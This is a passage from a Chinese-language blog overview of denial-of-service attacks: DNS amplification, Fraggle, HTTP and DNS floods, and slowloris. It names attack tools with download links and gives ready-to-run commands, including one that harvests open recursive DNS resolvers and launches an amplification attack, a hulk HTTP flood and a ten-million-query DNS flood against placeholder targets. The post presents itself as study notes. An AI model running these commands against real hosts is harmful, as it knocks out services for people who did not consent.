-<p>对比上面的连个图，发下放大攻击之后有大量的数据查询后的响应数据包返回给受害者的机器，这样就造成了对受害者的拒绝服务攻击。</p>
-<p>测试工具：Tsunami</p>
-<p>下载地址： <a href="https://www.infosec-ninjas.com/tsunami" target="_blank" rel="external">https://www.infosec-ninjas.com/tsunami</a></p>
-<p>测试命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 收集dns服务器 ./tsunami -o recursive_dns.txt -l 4 -e 172.0.0.0/8</div><div class="line"></div><div class="line">2 对目标进行攻击 ./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt</div></pre></td></tr></table></figure>
-<h3 id="Fraggle-Attack"><a href="#Fraggle-Attack" class="headerlink" title="Fraggle Attack"></a>Fraggle Attack</h3><p>攻击者向UDP端点发送大量的欺骗UDP洪促使这些端口回应目标。</p>
-<h2 id="应用层攻击"><a href="#应用层攻击" class="headerlink" title="应用层攻击"></a>应用层攻击</h2><p>应用层攻击也叫第七层攻击，可以实行DoS和DDoS攻击，这种类型的攻击是基于模仿人的行为。</p>
-<p>可能被利用的协议包括HTTP、HTTPS、DNS、SMTP、FTP、VOIP和其他的应用协议</p>
-<h3 id="HTTP泛洪"><a href="#HTTP泛洪" class="headerlink" title="HTTP泛洪"></a>HTTP泛洪</h3><p>HTTP泛洪是应用层攻击中最常见的攻击方式。</p>
-<p>这种类型的攻击可以尝试使用HTTP GET或者POST方式向服务器发出请求。通常来说需要多个电脑同时发出请求。</p>
-<p>测试工具：</p>
-<p>1 LOIC</p>
-<p>2 hulk <a href="http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/" target="_blank" rel="external">http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令:python hulk.py -site http://TARGET.com/test/</div></pre></td></tr></table></figure>
-<p>3 Apache JMeter <a href="https://jmeter.apache.org/" target="_blank" rel="external">https://jmeter.apache.org/</a></p>
-<h3 id="DNS泛洪"><a href="#DNS泛洪" class="headerlink" title="DNS泛洪"></a>DNS泛洪</h3><p>DNS泛洪像其他洪水攻击一样，DNS泛宏攻击的目的是向DNS应用发送大量DNS请求。DNS服务器不堪重负，无法处理来自其他用户的所有合法请求。</p>
-<p>测试工具：</p>
-<p>1 mz <a href="http://www.perihel.at/sec/mz/" target="_blank" rel="external">http://www.perihel.at/sec/mz/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">命令：mz -A rand -B TARGET_DNS_SERVER -t dns &quot;q=pentest.blog&quot; -c 10000000</div></pre></td></tr></table></figure>
-<p>2 netstressng <a href="https://sourceforge.net/projects/netstressng/" target="_blank" rel="external">https://sourceforge.net/projects/netstressng/</a></p>
-<p>命令：netstress.fullrandom -d TARGET_DNS_SERVER -a dns -t a -n 4 -P 53</p>
-<h3 id="Low和Slow攻击"><a href="#Low和Slow攻击" class="headerlink" title="Low和Slow攻击"></a>Low和Slow攻击</h3><p>这个攻击不像其他的泛洪攻击，他不需要大量的数据流量。这种类型的攻击针对的是应用程序和服务器资源。</p>
-<p>这种方式很难被检测，因为其流量跟正常流量没什么两样。</p>
-<p>测试工具：<a href="https://github.com/llaera/slowloris.pl" target="_blank" rel="external">https://github.com/llaera/slowloris.pl</a></p>
-<p>这个工具的原理就是通过打开多个连接并保持连接，直到服务器无法处理跟多的http请求，导致拒绝服务。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里说了这么多关于拒绝服务的方式，我知道这些内容并不是很全，而且解释的也比较简单，没有深入去解释各种协议，这些基础的东西就需要大家自行去研究学习。这里只是做一个简要介绍做个笔记。里面涉及的攻击就只能请大家自行测试了 。</p>
-<p>原文链接：<a href="https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw" target="_blank" rel="external">https://mp.weixin.qq.com/s/zH_1rHVP2-m-5yhtEGvNCw</a></p>
 ]]></content>
     
     <summary type="html">
